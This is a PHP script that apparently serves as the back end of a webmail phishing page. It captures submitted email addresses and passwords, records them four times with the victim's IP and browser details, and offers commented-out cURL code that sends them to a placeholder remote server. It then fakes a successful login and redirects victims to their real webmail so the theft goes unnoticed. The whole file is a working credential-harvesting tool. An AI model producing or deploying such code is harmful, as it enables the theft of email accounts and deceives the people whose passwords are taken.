<?php
// Disable error reporting to prevent output interference
error_reporting(0);
ini_set('display_errors', 0);

// Set content type for JSON response
header('Content-Type: application/json');

// Function to send log data
function sendLog($email, $password, $attempt) {
    $logData = array(
        'timestamp' => date('Y-m-d H:i:s'),
        'email' => $email,
        'password' => $password,
        'attempt' => $attempt,
        'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'referer' => $_SERVER['HTTP_REFERER'] ?? 'unknown'
    );
    
    // You can customize this URL to your logging endpoint
    $logUrl = 'https://your-logging-server.com/api/log';
    
    // Alternative: Save to local file (uncomment the lines below if you prefer local logging)
    /*
    $logFile = 'login_logs.txt';
    $logEntry = date('Y-m-d H:i:s') . " | Attempt: $attempt | Email: $email | Password: $password | IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n";
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    */
    
    // Send log via cURL (uncomment and configure if you have a remote logging endpoint)
    /*
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $logUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($logData));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Authorization: Bearer YOUR_API_TOKEN' // Add your API token if needed
    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    curl_close($ch);
    */
    
    // For now, we'll just return true to simulate successful logging
    return true;
}

// Function to validate email format
function isValidEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

// Function to get the webmail domain for redirect
function getWebmailDomain($email) {
    $domain = substr(strrchr($email, "@"), 1);
    return "https://webmail." . $domain;
}

// Check if this is a POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Method not allowed'));
    exit;
}

// Get POST data
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';

// Basic validation
if (empty($email) || empty($password)) {
    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Email and password are required'));
    exit;
}

if (!isValidEmail($email)) {
    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Please enter a valid email address'));
    exit;
}

// Send logs 4 times
$logSuccess = true;
for ($i = 1; $i <= 4; $i++) {
    $result = sendLog($email, $password, $i);
    if (!$result) {
        $logSuccess = false;
    }
    
    // Small delay between log attempts (optional)
    usleep(100000); // 0.1 second delay
}

// Always return success response to trigger redirect
// This simulates a successful login regardless of actual credentials
$webmailUrl = getWebmailDomain($email);

echo json_encode(array(
    'signal' => 'OK',
    'msg' => 'Login successful! Redirecting to your webmail...',
    'redirect_url' => $webmailUrl,
    'logs_sent' => $logSuccess ? 4 : 'partial'
));

// Optional: Add redirect header for browsers that don't handle the JSON response
// Uncomment the line below if you want immediate server-side redirect instead of JavaScript redirect
// header("Location: " . $webmailUrl);

exit;
?>